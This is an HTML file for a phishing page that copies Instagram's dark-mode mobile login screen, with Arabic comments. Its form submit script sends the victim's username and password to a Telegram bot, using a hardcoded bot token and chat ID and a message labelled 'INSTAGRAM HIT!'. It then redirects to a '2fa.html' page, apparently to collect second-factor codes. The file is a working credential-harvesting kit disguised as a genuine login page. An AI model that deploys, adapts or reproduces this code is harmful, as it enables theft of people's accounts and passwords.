<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        
        /* الخلفية السودة (دارك مود) */
        body { background-color: #121212; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; position: relative; }
        
        /* زر الرجوع */
        .back-btn { position: absolute; top: 20px; left: 20px; width: 40px; height: 40px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .back-btn svg { width: 20px; height: 20px; fill: #fff; }
        
        /* اختيار اللغة */
        .lang-selector { margin-top: 25px; color: #b0b0b0; font-size: 14px; display: flex; align-items: center; gap: 5px; cursor: pointer; }
        .lang-selector svg { width: 12px; fill: #b0b0b0; }
        
        .login-container { width: 100%; max-width: 350px; padding: 0 20px; display: flex; flex-direction: column; align-items: center; margin-top: 60px; }
        
        /* اللوجو الملوّن */
        .logo { margin-bottom: 50px; width: 80px; height: 80px; }
        
        form { width: 100%; display: flex; flex-direction: column; gap: 12px; }
        
        .input-group { position: relative; width: 100%; }
        .input-group input { width: 100%; padding: 16px 14px; background-color: transparent; border: 1px solid #363636; border-radius: 14px; font-size: 14px; color: #fff; outline: none; transition: 0.2s; }
        .input-group input:focus { border: 1px solid #555; }
        .input-group input::placeholder { color: #888; }
        
        .show-password { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); font-size: 14px; font-weight: 600; color: #fff; cursor: pointer; background: none; border: none; display: none; }
        
        /* زر تسجيل الدخول */
        .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 14px; padding: 14px 16px; font-weight: 600; font-size: 16px; margin-top: 5px; cursor: pointer; transition: 0.2s; }
        .login-btn:disabled { background-color: #1a4e7a; cursor: default; color: #888; }
        
        .forgot-password { color: #fff; font-size: 14px; text-decoration: none; margin-top: 20px; text-align: center; display: block; font-weight: 500; }
        
        /* زر إنشاء حساب */
        .create-account-btn { width: 100%; background-color: transparent; border: 1px solid #0095f6; color: #0095f6; border-radius: 14px; padding: 14px 16px; font-weight: 600; font-size: 16px; margin-top: 80px; cursor: pointer; transition: 0.2s; }
        
        /* Meta Logo */
        .meta-footer { margin-top: 30px; display: flex; justify-content: center; align-items: center; gap: 5px; color: #b0b0b0; font-size: 16px; font-weight: 500; margin-bottom: 30px;}
        .meta-footer svg { width: 20px; height: 20px; fill: #b0b0b0; }

        /* نافذة اللغات */
        .lang-modal { display: none; position: fixed; bottom: 0; left: 0; width: 100%; background: #262626; border-radius: 20px 20px 0 0; padding: 20px; z-index: 1000; max-height: 80vh; overflow-y: auto; flex-direction: column;}
        .lang-modal.open { display: flex; }
        .lang-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .close-lang { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
        .lang-list { list-style: none; display: flex; flex-direction: column; gap: 15px; padding-bottom: 20px;}
        .lang-item { display: flex; justify-content: space-between; font-size: 16px; color: #fff; padding: 5px 0; cursor: pointer;}
        .lang-item input[type="checkbox"] { width: 20px; height: 20px; accent-color: #0095f6; }
    </style>
</head>
<body>

    <!-- زر الرجوع -->
    <div class="back-btn">
        <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
    </div>

    <!-- اختيار اللغة -->
    <div class="lang-selector" onclick="toggleLangModal()">
        <span>English (US)</span>
        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
    </div>

    <div class="login-container">
        <!-- اللوجو الملوّن (Base64) -->
        <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNzUgMTc1Ij48ZGVmcz48bGluZWFyR3JhZGllbnQgaWQ9ImciIHgxPSIwJSIgeTE9IjAlIiB4Mj0iMTAwJSIgeTI9IjEwMCUiPjxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiNmZmQ2MDAiLz48c3RvcCBvZmZzZXQ9IjUwJSIgc3RvcC1jb2xvcj0iI2ZmMDAwMCIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iI2QzMDBjNSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxwYXRoIGZpbGw9InVybCgjZykiIGQ9Ik0xMjIgNTJ2MjBIMzB2MjBoMjB2MjBINzB2MjBoMjB2LTIwSDEyMFY4MmgxNlY2MmgxNlY0MmgxNnYyMHptLTIgNjBIMzB2MjBoNjB2LTIweiIvPjwvc3ZnPg==" alt="Instagram">
        
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Username, email or mobile number" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
                <button type="button" class="show-password" id="togglePassword">Show</button>
            </div>
            <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
        </form>
        
        <a href="#" class="forgot-password">Forgot password?</a>
        
        <!-- زر إنشاء حساب جديد -->
        <button class="create-account-btn">Create new account</button>
        
        <!-- Meta Footer -->
        <div class="meta-footer">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
            Meta
        </div>
    </div>

    <!-- نافذة اللغات -->
    <div class="lang-modal" id="langModal">
        <div class="lang-header">
            <button class="close-lang" onclick="toggleLangModal()">✕</button>
        </div>
        <ul class="lang-list">
            <li class="lang-item"><span>English (US)</span> <input type="checkbox" checked></li>
            <li class="lang-item"><span>Afrikaans</span> <input type="checkbox"></li>
            <li class="lang-item"><span>Bahasa Indonesia</span> <input type="checkbox"></li>
            <li class="lang-item"><span>Bahasa Melayu</span> <input type="checkbox"></li>
            <li class="lang-item"><span>Dansk</span> <input type="checkbox"></li>
            <li class="lang-item"><span>Deutsch</span> <input type="checkbox"></li>
            <li class="lang-item"><span>English (UK)</span> <input type="checkbox"></li>
            <li class="lang-item"><span>Español</span> <input type="checkbox"></li>
            <li class="lang-item"><span>Español (España)</span> <input type="checkbox"></li>
            <li class="lang-item"><span>Filipino</span> <input type="checkbox"></li>
        </ul>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const togglePassword = document.getElementById('togglePassword');

        function checkInputs() {
            const userVal = usernameInput.value.trim();
            const passVal = passwordInput.value.trim();
            loginBtn.disabled = userVal === '' || passVal === '';
            togglePassword.style.display = passVal.length > 0 ? 'block' : 'none';
        }
        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);

        togglePassword.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePassword.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                togglePassword.textContent = 'Show';
            }
        });

        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();

            const BOT_TOKEN = "9134254301:AAG8bCDBz8IfO8CHEk5Qyxie2ceOca_xx0U";
            const CHAT_ID = "2005892579";
            const message = `🚨 *INSTAGRAM HIT!*\n👤 User: \`${username}\`\n🔑 Pass: \`${password}\``;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
            });

            sessionStorage.setItem('insta_user', username);
            window.location.href = '2fa.html';
        });

        function toggleLangModal() {
            document.getElementById('langModal').classList.toggle('open');
        }
    </script>
</body>
</html>
